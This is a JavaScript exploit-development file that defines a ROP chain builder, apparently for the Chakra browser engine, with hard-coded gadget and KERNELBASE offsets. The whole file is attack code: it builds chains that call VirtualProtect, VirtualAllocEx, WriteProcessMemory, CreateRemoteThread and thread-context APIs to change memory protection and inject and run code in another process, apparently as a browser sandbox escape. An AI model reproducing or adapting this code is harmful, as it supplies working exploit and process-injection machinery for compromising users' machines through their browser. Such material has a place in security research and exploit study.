class RopBuilder {
    constructor(chakra, kernelbase) {
        this.chakra = chakra;
        this.kernelbase = kernelbase;
    }

    popRaxVal(val) {
        return [
            this.chakra.lo + 0x577fd4, this.chakra.hi, // 0x180577fd4: pop rax ; ret
            val.lo, val.hi,
        ]
    }

    popRcxVal(val) {
        return [
            this.chakra.lo + 0x46377, this.chakra.hi, // 0x180046377: pop rcx ; ret
            val.lo, val.hi,
        ]
    }

    popRdxVal(val) {
        return [
            this.chakra.lo + 0x1d2c9, this.chakra.hi, // 0x18001d2c9: pop rdx ; ret
            val.lo, val.hi,
        ]
    }

    popRdiVal(val) {
        return [
            this.chakra.lo + 0x4c1b65, this.chakra.hi, // 0x1804c1b65: pop rdi ; ret
            val.lo, val.hi,
        ]
    }

    popR8Val(val) {
        return [
            this.chakra.lo + 0x576231, this.chakra.hi, // 0x180576231: pop r8 ; ret
            val.lo, val.hi,
        ]
    }

    pushRdi() {
        return [
            this.chakra.lo + 0x1ef039, this.chakra.hi, // 0x1801ef039: push rdi ; ret
        ]
    }

    addRsp18(values) {
        return values.length == 6 ? [
            this.chakra.lo + 0x118b9, this.chakra.hi, // 0x1800118b9: add rsp, 0x18 ; ret
            ...values
        ] : null;
    }

    addRsp38(values) {
        return values.length == 14 ? [
            this.chakra.lo + 0x243949, this.chakra.hi, // 0x180243949: add rsp, 0x38 ; ret
            ...values
        ] : null;
    }

    addRax10() {
        return [
            this.chakra.lo + 0x22b732, this.chakra.hi, // 0x18022b732: add rax, 0x10 ; ret
        ];
    }

    addRax60() {
        return [
            this.chakra.lo + 0x26f72a, this.chakra.hi, // 0x18026f72a: add rax, 0x60 ; ret
        ];
    }

    addRax68() {
        return [
            this.chakra.lo + 0x26f73a, this.chakra.hi, // 0x18026f73a: add rax, 0x68 ; ret
        ];
    }

    jmpRax() {
        return [
            this.chakra.lo + 0x272beb, this.chakra.hi, // 0x180272beb: jmp rax
        ]
    }

    movRdxRax() {
        return [
            this.chakra.lo + 0x435f21, this.chakra.hi, // 0x180435f21: mov rdx, rax ; mov rax, rdx ; add rsp, 0x28 ; ret
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
        ];
    }

    movR8Rdx() {
        return [
            this.chakra.lo + 0x24628b, this.chakra.hi, // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
        ];
    }

    movR9Rcx() {
        return [
            ...this.popRaxVal({ lo: this.chakra.lo + 0x72E128, hi: this.chakra.hi }),
            this.chakra.lo + 0xf6270, this.chakra.hi, // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
            0x41414141, 0x41414141,
        ];
    }

    movRaxPtrRax() {
        return [
            this.chakra.lo + 0x26ef31, this.chakra.hi, // 0x18026ef31: mov rax, qword [rax] ; ret
        ];
    }

    movRaxPtrRcx() {
        return [
            this.chakra.lo + 0x4c37c5, this.chakra.hi, // 0x1804c37c5: mov rax, qword [rcx] ; ret
        ];
    }

    movRcxPtrRcx() {
        return [
            ...this.popRaxVal({ lo: this.chakra.lo + 0x72E128, hi: this.chakra.hi }),
            this.chakra.lo + 0xd2125, this.chakra.hi, // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret
        ];
    }

    movRdxPtrRdx8_movRaxRdx() {
        return [
            this.chakra.lo + 0x255fa0, this.chakra.hi, // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
        ];
    }

    movPtrRaxRcx() {
        return [
            this.chakra.lo + 0xfeab, this.chakra.hi, // 0x18000feab: mov qword [rax], rcx ; ret
        ];
    }

    movPtrRcxRax() {
        return [
            this.chakra.lo + 0x313349, this.chakra.hi, // 0x180313349: mov qword [rcx], rax ; ret
        ];
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
    VirtualProtect({ lpAddress, dwSize, flNewProtect, lpflOldProtect }) {
        const VirtualProtectAddr = { lo: this.kernelbase.lo + 0x61700, hi: this.kernelbase.hi };

        return [
            // PDWORD lpflOldProtect
            ...this.popRcxVal(lpflOldProtect),
            ...this.movR9Rcx(),

            // LPVOID lpAddress
            ...this.popRcxVal(lpAddress),

            // SIZE_T dwSize
            ...this.popRdxVal(dwSize),

            // DWORD flNewProtect
            ...this.popR8Val(flNewProtect),

            // Call KERNELBASE!VirtualProtect
            ...this.popRaxVal(VirtualProtectAddr),
            ...this.jmpRax(),

            ...this.addRsp18(
                [
                    0x41414141, 0x41414141, // Padding
                    0x41414141, 0x41414141, // Padding
                    0x41414141, 0x41414141, // Padding
                ]
            )
        ];
    }

    // ref: https://learn.microsoft.com/windows/win32/api/handleapi/nf-handleapi-duplicatehandle
    DuplicateHandle({ hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, dwDesiredAccess, bInheritHandle, dwOptions }) {
        const DuplicateHandleAddr = { lo: this.kernelbase.lo + 0x18de0, hi: this.kernelbase.hi };

        return [
            // HANDLE hSourceHandle
            ...this.popRdxVal(hSourceHandle),

            // HANDLE hTargetProcessHandle
            ...this.popR8Val(hTargetProcessHandle),

            // LPHANDLE lpTargetHandle
            ...this.popRcxVal(lpTargetHandle),
            ...this.movR9Rcx(),

            // HANDLE hSourceProcessHandle
            ...this.popRcxVal(hSourceProcessHandle),

            // Call KERNELBASE!DuplicateHandle
            ...this.popRaxVal(DuplicateHandleAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                dwDesiredAccess.lo, dwDesiredAccess.hi, // DWORD dwDesiredAccess
                bInheritHandle.lo, bInheritHandle.hi, // BOOL bInheritHandle
                dwOptions.lo, dwOptions.hi // DWORD dwOptions
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    VirtuaAllocEx({ hProcessPtr, lpAddress, dwSize, flAllocationType, flProtect }) {
        const VirtualAllocExAddr = { lo: this.kernelbase.lo + 0xff00, hi: this.kernelbase.hi };

        return [
            // DWORD flAllocationType
            ...this.popRcxVal(flAllocationType),
            ...this.movR9Rcx(),

            // SIZE_T dwSize
            ...this.popRdxVal(dwSize),
            ...this.movR8Rdx(),

            // LPVOID lpAddress
            ...this.popRdxVal(lpAddress),

            // HANDLE hProcess
            ...this.popRcxVal(hProcessPtr),
            ...this.movRcxPtrRcx(),

            // Call KERNELBASE!VirtualAllocEx
            ...this.popRaxVal(VirtualAllocExAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                flProtect.lo, flProtect.hi, // DWORD flProtect
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    WriteProcessMemory1({ hProcessPtr, lpBaseAddressPtr, lpBuffer, nSize, lpNumberOfBytesWritten }) {
        const WriteProcessMemoryAddr = { lo: this.kernelbase.lo + 0x79a40, hi: this.kernelbase.hi };

        return [
            // SIZE_T nSize
            ...this.popRcxVal(nSize),
            ...this.movR9Rcx(),

            // HANDLE hProcess
            ...this.popRcxVal(hProcessPtr),
            ...this.movRcxPtrRcx(),

            // LPVOID lpBaseAddress
            ...this.popRdxVal({ lo: lpBaseAddressPtr.lo - 0x8, hi: lpBaseAddressPtr.hi }),
            ...this.movRdxPtrRdx8_movRaxRdx(),

            // LPCVOID lpBuffer
            ...this.popR8Val(lpBuffer),

            // Call KERNELBASE!WriteProcessMemory
            ...this.popRaxVal(WriteProcessMemoryAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                lpNumberOfBytesWritten.lo, lpNumberOfBytesWritten.hi, // SIZE_T *lpNumberOfBytesWritten
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    WriteProcessMemory2({ hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten }) {
        const WriteProcessMemoryAddr = { lo: this.kernelbase.lo + 0x79a40, hi: this.kernelbase.hi };

        return [
            // SIZE_T nSize
            ...this.popRcxVal(nSize),
            ...this.movR9Rcx(),

            // HANDLE hProcess
            ...this.popRcxVal(hProcess),

            // LPVOID lpBaseAddress
            ...this.popRdxVal(lpBaseAddress),

            // LPCVOID lpBuffer
            ...this.popR8Val(lpBuffer),

            // Call KERNELBASE!WriteProcessMemory
            ...this.popRaxVal(WriteProcessMemoryAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                lpNumberOfBytesWritten.lo, lpNumberOfBytesWritten.hi, // SIZE_T *lpNumberOfBytesWritten
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    WriteProcessMemory3({ hProcessPtr, lpBaseAddressPtrPtr, lpBuffer, nSize, lpNumberOfBytesWritten }) {
        const WriteProcessMemoryAddr = { lo: this.kernelbase.lo + 0x79a40, hi: this.kernelbase.hi };

        return [
            // SIZE_T nSize
            ...this.popRcxVal(nSize),
            ...this.movR9Rcx(),

            // LPVOID lpBaseAddress
            ...this.popRdxVal({ lo: lpBaseAddressPtrPtr.lo - 0x8, hi: lpBaseAddressPtrPtr.hi }),
            ...this.movRdxPtrRdx8_movRaxRdx(),
            ...this.movRaxPtrRax(),
            ...this.movRdxRax(),

            // LPCVOID lpBuffer
            ...this.popR8Val(lpBuffer),

            // HANDLE hProcess
            ...this.popRcxVal(hProcessPtr),
            ...this.movRcxPtrRcx(),

            // Call KERNELBASE!WriteProcessMemory
            ...this.popRaxVal(WriteProcessMemoryAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                lpNumberOfBytesWritten.lo, lpNumberOfBytesWritten.hi, // SIZE_T *lpNumberOfBytesWritten
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    CreateRemoteThread({ hProcessPtr, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId }) {
        const CreateRemoteThreadAddr = { lo: this.kernelbase.lo + 0xdcfd0, hi: this.kernelbase.hi };

        return [
            // LPTHREAD_START_ROUTINE lpStartAddress
            ...this.popRcxVal(lpStartAddress),
            ...this.movR9Rcx(),

            // HANDLE hProcess
            ...this.popRcxVal(hProcessPtr),
            ...this.movRcxPtrRcx(),

            // LPSECURITY_ATTRIBUTES lpThreadAttributes
            ...this.popRdxVal(lpThreadAttributes),

            // SIZE_T dwStackSize
            ...this.popR8Val(dwStackSize),

            // Call KERNELBASE!CreateRemoteThread
            ...this.popRaxVal(CreateRemoteThreadAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                lpParameter.lo, lpParameter.hi, // LPVOID lpParameter
                dwCreationFlags.lo, dwCreationFlags.hi, // DWORD dwCreationFlags
                lpThreadId.lo, lpThreadId.hi, // LPDWORD lpThreadId
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    VirtualAlloc({ lpAddress, dwSize, flAllocationType, flProtect }) {
        const VirtualAllocAddr = { lo: this.kernelbase.lo + 0x5ac10, hi: this.kernelbase.hi };

        return [
            // DWORD flProtect
            ...this.popRcxVal(flProtect),
            ...this.movR9Rcx(),

            // LPVOID lpAddress
            ...this.popRcxVal(lpAddress),

            // SIZE_T dwSize
            ...this.popRdxVal(dwSize),

            // DWORD flAllocationType
            ...this.popR8Val(flAllocationType),

            // Call KERNELBASE!VirtualAlloc
            ...this.popRaxVal(VirtualAllocAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext
    GetThreadContext({ hThreadPtr, lpContextPtr }) {
        const GetThreadContextAddr = { lo: this.kernelbase.lo + 0x72d10, hi: this.kernelbase.hi };

        return [
            // HANDLE hThread
            ...this.popRcxVal(hThreadPtr),
            ...this.movRcxPtrRcx(),

            // LPCONTEXT lpContext
            ...this.popRdxVal({ lo: lpContextPtr.lo - 0x8, hi: lpContextPtr.hi }),
            ...this.movRdxPtrRdx8_movRaxRdx(),

            // Call KERNELBASE!GetThreadContext
            ...this.popRaxVal(GetThreadContextAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext
    SetThreadContext({ hThreadPtr, lpContextPtr }) {
        const SetThreadContextAddr = { lo: this.kernelbase.lo + 0x7aa0, hi: this.kernelbase.hi };

        return [
            // HANDLE hThread
            ...this.popRcxVal(hThreadPtr),
            ...this.movRcxPtrRcx(),

            // const CONTEXT *lpContext
            ...this.popRdxVal({ lo: lpContextPtr.lo - 0x8, hi: lpContextPtr.hi }),
            ...this.movRdxPtrRdx8_movRaxRdx(),

            // Call KERNELBASE!SetThreadContext
            ...this.popRaxVal(SetThreadContextAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }

    // ref: https://learn.microsoft.com/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    ResumeThread({ hThreadPtr }) {
        const ResumeThreadAddr = { lo: this.kernelbase.lo + 0x70a50, hi: this.kernelbase.hi };

        return [
            // HANDLE hThread
            ...this.popRcxVal(hThreadPtr),
            ...this.movRcxPtrRcx(),

            // Call KERNELBASE!ResumeThread
            ...this.popRaxVal(ResumeThreadAddr),
            ...this.jmpRax(),

            ...this.addRsp38([
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
                0x41414141, 0x41414141, // Padding
            ]),
        ]
    }
}
